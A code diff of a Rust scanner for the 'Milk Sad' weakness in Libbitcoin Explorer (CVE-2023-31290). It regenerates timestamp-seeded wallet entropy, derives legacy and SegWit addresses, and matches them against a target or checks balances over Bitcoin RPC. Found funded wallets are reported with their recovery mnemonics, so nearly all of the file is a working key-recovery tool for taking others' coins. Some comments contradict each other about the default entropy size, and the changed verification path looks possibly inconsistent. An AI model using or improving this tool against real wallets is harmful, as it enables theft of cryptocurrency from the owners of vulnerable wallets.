@@ -1,20 +1,70 @@
+//! Milk Sad Vulnerability Scanner (CVE-2023-31290)
+//!
+//! Implements scanning for the Libbitcoin Explorer `bx seed` vulnerability where
+//! MT19937 PRNG was seeded with only 32-bit timestamp, producing weak entropy.
+//!
+//! Supports:
+//! - 128-bit (12 words), 192-bit (18 words), 256-bit (24 words) entropy
+//! - BIP44 (P2PKH, prefix 1), BIP49 (P2SH-SegWit, prefix 3), BIP84 (Native SegWit, prefix bc1q)
+//! - External (0) and internal/change (1) address derivation
+//!
+//! Reference: https://milksad.info/disclosure.html
+
 #[cfg(feature = "gpu")]
 use crate::scans::gpu_solver::GpuSolver;
 use anyhow::Result;
-#[cfg(feature = "gpu")]
 use bip39::Mnemonic;
-#[cfg(feature = "gpu")]
 use bitcoin::bip32::{DerivationPath, Xpriv};
-#[cfg(feature = "gpu")]
 use bitcoin::secp256k1::Secp256k1;
-#[cfg(feature = "gpu")]
-use bitcoin::{Address, Network};
-#[cfg(feature = "gpu")]
+use bitcoin::{Address, Network, CompressedPublicKey};
 use rand_mt::Mt19937GenRand32;
-#[cfg(feature = "gpu")]
 use std::str::FromStr;
 use tracing::{info, warn, error};
 use bitcoincore_rpc::{Client, RpcApi, Auth};
+
+/// Supported entropy sizes (in bits)
+#[derive(Debug, Clone, Copy, PartialEq)]
+pub enum EntropySize {
+    Bits128, // 12 words (default bx seed -b 128)
+    Bits192, // 18 words (bx seed -b 192, the default)
+    Bits256, // 24 words (bx seed -b 256)
+}
+
+impl EntropySize {
+    pub fn byte_len(&self) -> usize {
+        match self {
+            EntropySize::Bits128 => 16,
+            EntropySize::Bits192 => 24,
+            EntropySize::Bits256 => 32,
+        }
+    }
+
+    pub fn word_count(&self) -> usize {
+        match self {
+            EntropySize::Bits128 => 12,
+            EntropySize::Bits192 => 18,
+            EntropySize::Bits256 => 24,
+        }
+    }
+}
+
+/// Supported address types
+#[derive(Debug, Clone, Copy, PartialEq)]
+pub enum AddressType {
+    P2PKH,      // BIP44: m/44'/0'/0'/c/a - Legacy (prefix 1)
+    P2SHWPKH,   // BIP49: m/49'/0'/0'/c/a - SegWit-compatible (prefix 3)
+    P2WPKH,     // BIP84: m/84'/0'/0'/c/a - Native SegWit (prefix bc1q)
+}
+
+impl AddressType {
+    pub fn purpose(&self) -> u32 {
+        match self {
+            AddressType::P2PKH => 44,
+            AddressType::P2SHWPKH => 49,
+            AddressType::P2WPKH => 84,
+        }
+    }
+}
 
 /// Unified Milk Sad Scanner Entry Point
 pub fn run_scan(
@@ -24,7 +74,8 @@ pub fn run_scan(
     multipath: bool,
     rpc_config: Option<(String, String, String)>,
 ) -> Result<()> {
-    info!("Milk Sad Vulnerability Scanner (GPU-Accelerated)");
+    info!("Milk Sad Vulnerability Scanner (Enhanced)");
+    info!("Supports: 128/192/256-bit entropy, BIP44/49/84 paths");
     
     // Time range: Default to 2011-2023
     let start_ts = start_ts_opt.unwrap_or(1293840000u32); 
@@ -56,44 +107,36 @@ fn run_with_target(
     end_ts: u32,
     multipath: bool,
 ) -> Result<()> {
-    info!("Milk Sad Vulnerability Scanner (100% GPU)");
-    if multipath {
-        info!("Mode: Multi-Path (Checking 30 addresses per timestamp)");
-    } else {
-        info!("Mode: Single-Path (Checking m/44'/0'/0'/0/0 only)");
-    }
-    info!("Target Address: {}", target);
-
-    use bitcoin::Address; // v0.32: Address is at bitcoin::Address
-    use std::str::FromStr;
-    // Parse address - v0.32 returns Address<NetworkUnchecked>
-    let address = Address::from_str(&target)?.assume_checked();
-    let script = address.script_pubkey();
-    if !script.is_p2pkh() {
-        warn!("Warning: Not a P2PKH address, skipping.");
-        return Ok(());
-    }
-    let target_hash160_slice = &script.as_bytes()[3..23];
-    let mut target_hash160: [u8; 20] = [0; 20];
-    target_hash160.copy_from_slice(target_hash160_slice);
-
-    info!("Target Hash160: {}", hex::encode(&target_hash160));
-
-    info!(
-        "Scanning timestamps {} to {} ({} seconds)...",
-        start_ts,
-        end_ts,
-        end_ts - start_ts
-    );
-
-    #[cfg(not(feature = "gpu"))]
-    {
-        warn!("This scanner requires GPU acceleration. Please recompile with --features gpu");
-        return Err(anyhow::anyhow!("GPU feature disabled"));
-    }
-
     #[cfg(feature = "gpu")]
     {
+        info!("Milk Sad Vulnerability Scanner (100% GPU)");
+        if multipath {
+            info!("Mode: Multi-Path (Checking 30 addresses per timestamp)");
+        } else {
+            info!("Mode: Single-Path (Checking m/44'/0'/0'/0/0 only)");
+        }
+        info!("Target Address: {}", target);
+
+        // Parse address - v0.32 returns Address<NetworkUnchecked>
+        let address = Address::from_str(&target)?.assume_checked();
+        let script = address.script_pubkey();
+        if !script.is_p2pkh() {
+            warn!("Warning: Not a P2PKH address, skipping.");
+            return Ok(());
+        }
+        let target_hash160_slice = &script.as_bytes()[3..23];
+        let mut target_hash160: [u8; 20] = [0; 20];
+        target_hash160.copy_from_slice(target_hash160_slice);
+
+        info!("Target Hash160: {}", hex::encode(&target_hash160));
+
+        info!(
+            "Scanning timestamps {} to {} ({} seconds)...",
+            start_ts,
+            end_ts,
+            end_ts - start_ts
+        );
+
         let start_time = std::time::Instant::now();
         let solver = GpuSolver::new()?;
         info!("[GPU] Solver initialized");
@@ -107,8 +150,8 @@ fn run_with_target(
                 );
                 for (timestamp, addr_idx) in results {
                     // Verify on CPU
-                    let entropy = generate_milk_sad_entropy(timestamp);
-                    let derived_address = generate_address_from_entropy(&entropy, addr_idx);
+                    let entropy = generate_entropy_msb(timestamp, EntropySize::Bits128);
+                    let derived_address = generate_address_from_entropy_vec(&entropy, addr_idx, AddressType::P2PKH, false);
 
                     if derived_address == target {
                         info!("\n[VERIFIED] 🔓 CRACKED SUCCESSFUL!");
@@ -139,8 +182,8 @@ fn run_with_target(
                 );
                 for timestamp in results {
                     // Verify on CPU (index 0)
-                    let entropy = generate_milk_sad_entropy(timestamp as u32);
-                    let derived_address = generate_address_from_entropy(&entropy, 0);
+                    let entropy = generate_entropy_msb(timestamp as u32, EntropySize::Bits128);
+                    let derived_address = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, false);
 
                     if derived_address == target {
                         info!("\n[VERIFIED] 🔓 CRACKED SUCCESSFUL!");
@@ -165,96 +208,333 @@ fn run_with_target(
         info!("Time elapsed: {:.2}s", start_time.elapsed().as_secs_f64());
         Ok(())
     }
+
+    #[cfg(not(feature = "gpu"))]
+    {
+        warn!("GPU feature disabled. Running CPU scan for target: {}", target);
+        run_cpu_target_scan(target, start_ts, end_ts, multipath)
+    }
 }
 
-/// RPC Scan Mode (Generates addresses and checks balance)
-/// Note: This is purely CPU based for now unless we implement bloom filter or fast RPC calls.
-/// Because RPC is network bound, GPU generation is overkill if we serialize every address.
-/// BUT: We can use GPU to generate seeds, then CPU to derive addresses and check.
-/// Actually, implementing purely on CPU for RPC mode is acceptable given RPC latency (~10ms per call).
-/// 10ms * 1M addresses = 10,000 seconds (3 hours). 
-fn run_rpc_scan(start_ts: u32, end_ts: u32, multipath: bool, rpc: Client) -> Result<()> {
-    info!("Mode: RPC Sweep (Checking balances for ALL derived addresses)");
-    info!("Scanning {} timestamps...", end_ts - start_ts);
+/// CPU-based target scan (fallback when GPU not available)
+#[cfg(not(feature = "gpu"))]
+fn run_cpu_target_scan(target: &str, start_ts: u32, end_ts: u32, multipath: bool) -> Result<()> {
+    let entropy_sizes = [EntropySize::Bits128, EntropySize::Bits192, EntropySize::Bits256];
+    let address_types = [AddressType::P2PKH, AddressType::P2SHWPKH, AddressType::P2WPKH];
     
-    let _start_time = std::time::Instant::now();
-    let mut checked = 0;
+    let start_time = std::time::Instant::now();
+    let mut checked = 0u64;
     
-    for t in start_ts..=end_ts {
-        let entropy = generate_milk_sad_entropy(t);
-        // Only check index 0 by default to save time, unless multipath
-        let limit = if multipath { 5 } else { 1 }; 
-        
-        for i in 0..limit {
-            let address_str = generate_address_from_entropy(&entropy, i);
-            if let Ok(address) = Address::from_str(&address_str) {
-                // Check balance
-                // assume_checked is risky if address is invalid, but we generated it.
-                // We use assume_checked() for bitcoincore-rpc compatibility? 
-                // bitcoincore_rpc expects Address type.
-                match rpc.get_received_by_address(&address.assume_checked(), Some(0)) {
-                    Ok(balance) => {
-                         if balance.to_sat() > 0 {
-                             warn!("\n💰 FUNDED WALLET FOUND!");
-                             warn!("Timestamp: {}", t);
-                             warn!("Address: {}", address_str);
-                             warn!("Total Received: {}", balance);
-                             warn!("Entropy: {}", hex::encode(&entropy));
-                         }
-                    }
-                    Err(_e) => {
-                        // Rate limit or error?
-                        // warn!("RPC Error: {}", e);
+    for ts in start_ts..=end_ts {
+        for &entropy_size in &entropy_sizes {
+            let entropy = generate_entropy_msb(ts, entropy_size);
+            
+            for &addr_type in &address_types {
+                let limit = if multipath { 20 } else { 1 };
+                for change in [false, true] {
+                    for addr_idx in 0..limit {
+                        let address = generate_address_from_entropy_vec(&entropy, addr_idx, addr_type, change);
+                        
+                        if address == target {
+                            warn!("\n🔓 FOUND MATCH!");
+                            warn!("Timestamp: {}", ts);
+                            warn!("Entropy Size: {:?}", entropy_size);
+                            warn!("Address Type: {:?}", addr_type);
+                            warn!("Change: {}, Index: {}", change, addr_idx);
+                            warn!("Entropy: {}", hex::encode(&entropy));
+                            if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
+                                warn!("Mnemonic: {}", mnemonic);
+                            }
+                            return Ok(());
+                        }
+                        checked += 1;
                     }
                 }
             }
         }
-        checked += 1;
-        if checked % 100 == 0 {
-             // info!("Checked {} timestamps...", checked);
+        
+        if ts % 10000 == 0 {
+            info!("Checked {} timestamps, {} addresses total...", ts - start_ts, checked);
         }
     }
-    info!("RPC Scan complete.");
+    
+    info!("CPU scan complete. Checked {} addresses in {:.2}s", 
+          checked, start_time.elapsed().as_secs_f64());
     Ok(())
 }
 
-/// Generate 128-bit entropy using MT19937 with MSB extraction
-#[cfg(feature = "gpu")]
-fn generate_milk_sad_entropy(timestamp: u32) -> [u8; 16] {
-    let mut rng = Mt19937GenRand32::new(timestamp);
-    let mut entropy = [0u8; 16];
-    for i in 0..4 {
-        let val = rng.next_u32();
-        entropy[i * 4] = ((val >> 24) & 0xFF) as u8;
-        entropy[i * 4 + 1] = ((val >> 16) & 0xFF) as u8;
-        entropy[i * 4 + 2] = ((val >> 8) & 0xFF) as u8;
-        entropy[i * 4 + 3] = (val & 0xFF) as u8;
+/// RPC Scan Mode - Enhanced with all entropy sizes and address types
+fn run_rpc_scan(start_ts: u32, end_ts: u32, multipath: bool, rpc: Client) -> Result<()> {
+    info!("Mode: RPC Sweep (Checking ALL entropy sizes and address types)");
+    info!("Entropy: 128/192/256-bit | Paths: BIP44/49/84 | Change: yes");
+    info!("Scanning {} timestamps...", end_ts - start_ts);
+    
+    let entropy_sizes = [EntropySize::Bits128, EntropySize::Bits192, EntropySize::Bits256];
+    let address_types = [AddressType::P2PKH, AddressType::P2SHWPKH, AddressType::P2WPKH];
+    
+    let start_time = std::time::Instant::now();
+    let mut checked = 0u64;
+    let mut found = 0u64;
+    
+    for t in start_ts..=end_ts {
+        for &entropy_size in &entropy_sizes {
+            let entropy = generate_entropy_msb(t, entropy_size);
+            
+            for &addr_type in &address_types {
+                // Check external (0) and internal/change (1) chains
+                for change in [false, true] {
+                    // Only check index 0 by default to save time, unless multipath
+                    let limit = if multipath { 20 } else { 1 };
+                    
+                    for i in 0..limit {
+                        let address_str = generate_address_from_entropy_vec(&entropy, i, addr_type, change);
+                        if let Ok(address) = Address::from_str(&address_str) {
+                            match rpc.get_received_by_address(&address.assume_checked(), Some(0)) {
+                                Ok(balance) => {
+                                     if balance.to_sat() > 0 {
+                                         found += 1;
+                                         warn!("\n💰 FUNDED WALLET FOUND!");
+                                         warn!("Timestamp: {}", t);
+                                         warn!("Entropy Size: {:?} ({} words)", entropy_size, entropy_size.word_count());
+                                         warn!("Address Type: {:?}", addr_type);
+                                         warn!("Path: m/{}'/{}'/{}'/{}/{}", 
+                                               addr_type.purpose(), 0, 0, if change { 1 } else { 0 }, i);
+                                         warn!("Address: {}", address_str);
+                                         warn!("Total Received: {}", balance);
+                                         warn!("Entropy: {}", hex::encode(&entropy));
+                                         if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
+                                             warn!("Mnemonic: {}", mnemonic);
+                                         }
+                                     }
+                                }
+                                Err(_e) => {
+                                    // Rate limit or error - skip silently
+                                }
+                            }
+                        }
+                        checked += 1;
+                    }
+                }
+            }
+        }
+        
+        if (t - start_ts) % 1000 == 0 && t > start_ts {
+            let elapsed = start_time.elapsed().as_secs_f64();
+            let speed = checked as f64 / elapsed;
+            info!("Progress: {} ts | {} addrs checked | {:.0} addr/s | {} found", 
+                  t - start_ts, checked, speed, found);
+        }
     }
+    
+    info!("RPC Scan complete. Checked {} addresses, found {} funded.", checked, found);
+    Ok(())
+}
+
+// ============================================================================
+// ENTROPY GENERATION (MSB extraction - bx pattern)
+// ============================================================================
+
+/// Generate entropy using MT19937 with MSB extraction (libbitcoin/bx pattern)
+/// 
+/// bx takes only the MOST SIGNIFICANT BYTE from each 32-bit MT19937 output,
+/// throwing away the other 3 bytes. This means:
+/// - 128-bit entropy requires 16 MT19937 outputs
+/// - 192-bit entropy requires 24 MT19937 outputs  
+/// - 256-bit entropy requires 32 MT19937 outputs
+pub fn generate_entropy_msb(timestamp: u32, size: EntropySize) -> Vec<u8> {
+    let byte_len = size.byte_len();
+    
+    let mut rng = Mt19937GenRand32::new(timestamp);
+    let mut entropy = vec![0u8; byte_len];
+    
+    // Each entropy byte comes from the MSB of a separate MT19937 output
+    for i in 0..byte_len {
+        let val = rng.next_u32();
+        // MSB extraction: take ONLY bits 31:24 (most significant byte)
+        entropy[i] = ((val >> 24) & 0xFF) as u8;
+    }
+    
     entropy
 }
 
-/// Generate Bitcoin address from entropy using BIP39/BIP44
+/// Generate 128-bit entropy (legacy function for GPU compatibility)
 #[cfg(feature = "gpu")]
-fn generate_address_from_entropy(entropy: &[u8; 16], addr_index: u32) -> String {
-    let mnemonic = Mnemonic::from_entropy(entropy)
-        .expect("Failed to create mnemonic from entropy - this should not happen with valid 16-byte entropy");
+pub fn generate_milk_sad_entropy(timestamp: u32) -> [u8; 16] {
+    let vec = generate_entropy_msb(timestamp, EntropySize::Bits128);
+    let mut arr = [0u8; 16];
+    arr.copy_from_slice(&vec);
+    arr
+}
+
+// Non-GPU version for RPC scan
+#[cfg(not(feature = "gpu"))]
+fn generate_milk_sad_entropy(timestamp: u32) -> [u8; 16] {
+    let vec = generate_entropy_msb(timestamp, EntropySize::Bits128);
+    let mut arr = [0u8; 16];
+    arr.copy_from_slice(&vec);
+    arr
+}
+
+// ============================================================================
+// ADDRESS GENERATION (BIP44/49/84)
+// ============================================================================
+
+/// Generate Bitcoin address from entropy with configurable address type
+/// 
+/// - addr_type: P2PKH (BIP44), P2SHWPKH (BIP49), P2WPKH (BIP84)
+/// - change: false = external (0), true = internal/change (1)
+/// - addr_index: address index within the chain
+pub fn generate_address_from_entropy_vec(
+    entropy: &[u8], 
+    addr_index: u32, 
+    addr_type: AddressType,
+    change: bool,
+) -> String {
+    let mnemonic = match Mnemonic::from_entropy(entropy) {
+        Ok(m) => m,
+        Err(_) => return String::new(),
+    };
     let seed = mnemonic.to_seed("");
 
     let secp = Secp256k1::new();
-    let root =
-        Xpriv::new_master(Network::Bitcoin, &seed).expect("Failed to create master key from seed");
+    let network = Network::Bitcoin;
+    
+    let root = match Xpriv::new_master(network, &seed) {
+        Ok(r) => r,
+        Err(_) => return String::new(),
+    };
 
-    // Path: m/44'/0'/0'/0/i
-    let path_str = format!("m/44'/0'/0'/0/{}", addr_index);
-    let path = DerivationPath::from_str(&path_str)
-        .expect("Failed to parse derivation path - hardcoded path should be valid");
-    let derived = root
-        .derive_priv(&secp, &path)
-        .expect("Failed to derive child key");
+    // Build derivation path: m/purpose'/coin'/account'/change/index
+    let purpose = addr_type.purpose();
+    let change_idx = if change { 1 } else { 0 };
+    let path_str = format!("m/{}'/{}'/{}'/{}/{}", purpose, 0, 0, change_idx, addr_index);
+    
+    let path = match DerivationPath::from_str(&path_str) {
+        Ok(p) => p,
+        Err(_) => return String::new(),
+    };
+    
+    let derived = match root.derive_priv(&secp, &path) {
+        Ok(d) => d,
+        Err(_) => return String::new(),
+    };
 
-    let private_key = bitcoin::PrivateKey::new(derived.private_key, Network::Bitcoin);
+    let private_key = bitcoin::PrivateKey::new(derived.private_key, network);
     let pubkey = private_key.public_key(&secp);
-    let address = Address::p2pkh(pubkey, Network::Bitcoin);
+    
+    // Generate address based on type
+    match addr_type {
+        AddressType::P2PKH => {
+            Address::p2pkh(pubkey, network).to_string()
+        }
+        AddressType::P2SHWPKH => {
+            // P2SH-wrapped SegWit (BIP49) - prefix "3"
+            let compressed = CompressedPublicKey(pubkey.inner);
+            Address::p2shwpkh(&compressed, network).to_string()
+        }
+        AddressType::P2WPKH => {
+            // Native SegWit (BIP84) - prefix "bc1q"
+            let compressed = CompressedPublicKey(pubkey.inner);
+            Address::p2wpkh(&compressed, network).to_string()
+        }
+    }
+}
 
-    address.to_string()
+/// Legacy function for GPU compatibility
+#[cfg(feature = "gpu")]  
+fn generate_address_from_entropy(entropy: &[u8; 16], addr_index: u32) -> String {
+    generate_address_from_entropy_vec(entropy, addr_index, AddressType::P2PKH, false)
+}
+
+// ============================================================================
+// TESTS
+// ============================================================================
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_entropy_generation_128bit() {
+        // Timestamp 0 should produce "milk sad wage cup..." mnemonic
+        let entropy = generate_entropy_msb(0, EntropySize::Bits128);
+        assert_eq!(entropy.len(), 16);
+        
+        let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
+        let words: Vec<&str> = mnemonic.word_iter().collect();
+        assert_eq!(words[0], "milk");
+        assert_eq!(words[1], "sad");
+    }
+
+    #[test]
+    fn test_entropy_generation_192bit() {
+        let entropy = generate_entropy_msb(0, EntropySize::Bits192);
+        assert_eq!(entropy.len(), 24);
+        
+        let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
+        assert_eq!(mnemonic.word_count(), 18);
+    }
+
+    #[test]
+    fn test_entropy_generation_256bit() {
+        let entropy = generate_entropy_msb(0, EntropySize::Bits256);
+        assert_eq!(entropy.len(), 32);
+        
+        let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
+        assert_eq!(mnemonic.word_count(), 24);
+    }
+
+    #[test]
+    fn test_address_types() {
+        let entropy = generate_entropy_msb(0, EntropySize::Bits128);
+        
+        // BIP44 - Legacy P2PKH (prefix 1)
+        let p2pkh = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, false);
+        assert!(p2pkh.starts_with('1'), "P2PKH should start with 1, got: {}", p2pkh);
+        
+        // BIP49 - SegWit-compatible P2SH (prefix 3)
+        let p2shwpkh = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2SHWPKH, false);
+        assert!(p2shwpkh.starts_with('3'), "P2SHWPKH should start with 3, got: {}", p2shwpkh);
+        
+        // BIP84 - Native SegWit (prefix bc1q)
+        let p2wpkh = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2WPKH, false);
+        assert!(p2wpkh.starts_with("bc1q"), "P2WPKH should start with bc1q, got: {}", p2wpkh);
+    }
+
+    #[test]
+    fn test_change_addresses() {
+        let entropy = generate_entropy_msb(12345, EntropySize::Bits128);
+        
+        let external = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, false);
+        let internal = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, true);
+        
+        // External and internal addresses should be different
+        assert_ne!(external, internal);
+    }
+
+    /// CRITICAL: Validate implementation produces correct 'milk sad' mnemonic for timestamp 0
+    /// This is the canonical test case from the Milk Sad vulnerability disclosure
+    #[test]
+    fn test_validate_milk_sad_mnemonic() {
+        // Timestamp 0 with 256-bit entropy MUST produce "milk sad wage cup..." mnemonic
+        // This is THE defining test for libbitcoin/bx vulnerability
+        let entropy_ts0 = generate_entropy_msb(0, EntropySize::Bits256);
+        let mnemonic = Mnemonic::from_entropy(&entropy_ts0).unwrap();
+        let words: Vec<&str> = mnemonic.word_iter().collect();
+        
+        assert_eq!(words[0], "milk", "First word must be 'milk' for timestamp 0");
+        assert_eq!(words[1], "sad", "Second word must be 'sad' for timestamp 0");
+        assert_eq!(words[2], "wage", "Third word must be 'wage' for timestamp 0");
+        assert_eq!(words[3], "cup", "Fourth word must be 'cup' for timestamp 0");
+        
+        // Also validate 128-bit entropy (12 words) produces valid mnemonic
+        let entropy_128 = generate_entropy_msb(0, EntropySize::Bits128);
+        let mnemonic_128 = Mnemonic::from_entropy(&entropy_128).unwrap();
+        assert_eq!(mnemonic_128.word_count(), 12);
+        
+        // The 12-word version also starts with "milk sad" for timestamp 0
+        let words_128: Vec<&str> = mnemonic_128.word_iter().collect();
+        assert_eq!(words_128[0], "milk", "128-bit: First word must be 'milk'");
+        assert_eq!(words_128[1], "sad", "128-bit: Second word must be 'sad'");
+    }
 }
